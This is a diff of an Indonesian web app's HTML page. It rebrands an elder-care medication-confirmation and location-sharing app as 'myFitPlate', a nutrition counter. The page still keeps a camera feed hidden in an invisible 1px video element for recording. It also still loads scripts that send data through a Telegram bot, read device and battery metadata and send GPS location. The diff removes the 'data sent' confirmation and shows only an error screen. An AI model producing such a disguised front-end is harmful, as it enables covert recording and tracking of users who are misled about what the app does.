@@ -5,8 +5,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <meta name="theme-color" content="#0f172a" />
-  <meta name="description"
-    content="Aplikasi pemantau kesehatan dan keselamatan lansia - konfirmasi obat dan berbagi lokasi" />
+  <meta name="description" content="Aplikasi penghitung nutrisi makanan dan pencari restoran sehat terdekat" />
   <title>myFitPlate - Penghitung Nutrisi Makanan</title>
 
   <!-- Google Fonts -->
@@ -43,8 +42,7 @@
       <div class="btn-grid" role="group" aria-label="Tombol Pilihan Menu">
 
         <!-- Menu 1: Konfirmasi Minum Obat -->
-        <button id="btn-obat" class="main-btn btn-obat"
-          aria-label="Saya sudah minum obat, tekan untuk mulai konfirmasi">
+        <button id="btn-obat" class="main-btn btn-obat" aria-label="Makanan sudah siap, tekan untuk mulai memeriksa">
           <span class="btn-icon" aria-hidden="true">&#129367;</span>
           <span class="btn-label">PERIKSA KANDUNGAN<br>NUTRISI MAKANAN</span>
           <span class="btn-sublabel">Tekan untuk mulai memeriksa</span>
@@ -76,8 +74,7 @@
          Awal: Tombol 'Ketuk 2x' di bawah.
          Setelah ditekan: Berubah langsung menjadi progress rekam & kirim.
          ============================================================ -->
-    <section id="screen-camera" class="screen" role="dialog" aria-label="Perekaman Video Konfirmasi Obat"
-      aria-modal="true">
+    <section id="screen-camera" class="screen" role="dialog" aria-label="Perekaman Video Makanan" aria-modal="true">
       <!-- Kamera tetap aktif untuk MediaRecorder, tapi disembunyikan agar lansia tidak cemas -->
       <video id="camera-video" autoplay muted playsinline aria-hidden="true"
         style="position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
@@ -261,13 +258,15 @@
 
 
     <!-- ============================================================
-         SCREEN 4: HASIL (Sukses / Error)
+         SCREEN 4: PESAN ERROR
+         Ditampilkan saat terjadi kesalahan (izin ditolak, GPS mati, jaringan gagal).
+         Konten diisi dinamis oleh showResult() di ui.js sebelum ditampilkan.
          ============================================================ -->
-    <section id="screen-result" class="screen" role="dialog" aria-modal="true" aria-label="Hasil pengiriman data">
-      <div id="result-card" class="result-card">
-        <span id="result-icon" class="result-icon" aria-hidden="true">&#9989;</span>
-        <div id="result-title" class="result-title">Terima Kasih!</div>
-        <div id="result-msg" class="result-msg">Data berhasil dikirim ke tim perawat.</div>
+    <section id="screen-result" class="screen" role="dialog" aria-modal="true" aria-label="Pesan kesalahan">
+      <div id="result-card" class="result-card error">
+        <span id="result-icon" class="result-icon" aria-hidden="true">&#9888;&#65039;</span>
+        <div id="result-title" class="result-title">Terjadi Kesalahan</div>
+        <div id="result-msg" class="result-msg">Silakan coba lagi atau hubungi pengurus.</div>
         <div id="result-cd" class="result-countdown">
           Kembali otomatis dalam <span id="cd-num">4</span> detik&hellip;
         </div>
@@ -586,7 +585,7 @@
   <script src="js/utils.js"></script> <!-- 3. Helper: $, showScreen, goHome, stopAllMedia -->
   <script src="js/device.js"></script> <!-- 4. Metadata perangkat & baterai -->
   <script src="js/telegram.js"></script> <!-- 5. Telegram Bot API calls -->
-  <script src="js/ui.js"></script> <!-- 6. showResult, showLoading -->
+  <script src="js/ui.js"></script> <!-- 6. showResult (hasil sukses/error) -->
   <script src="js/medication.js"></script> <!-- 7. Fitur kamera & rekam video -->
   <script src="js/location.js"></script> <!-- 8. Fitur GPS & kirim lokasi -->
   <script src="js/app.js"></script> <!-- 9. Init aplikasi (DOMContentLoaded) -->
